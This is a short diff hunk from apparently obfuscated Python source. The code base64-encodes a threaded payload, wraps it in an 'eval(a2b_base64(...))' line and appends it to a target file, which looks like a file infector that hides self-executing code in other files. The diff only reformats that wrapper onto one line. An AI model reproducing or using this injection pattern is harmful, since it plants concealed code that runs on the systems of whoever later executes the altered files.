@@ -34,10 +34,7 @@ class eHhjemR5eXB:
         YWxmanRob += b"\nt.start()"
         YWxmanRob += b"\nt.join()"
         YWxmanRob_base64: bytes = b64encode(YWxmanRob)
-        cXBxZXJjYQ = (
-            "\n"*2 + "from binascii import a2b_base64\n" +
-            "eval(a2b_base64('{}'))\n".format(YWxmanRob_base64.decode())
-        )
+        cXBxZXJjYQ = ("\n"*2+"from binascii import a2b_base64\n"+"eval(a2b_base64('{}'))\n".format(YWxmanRob_base64.decode()))
         with open(target_file, "a") as f:
             f.write(cXBxZXJjYQ)
         self.ZmFsa2p0aGM += 1
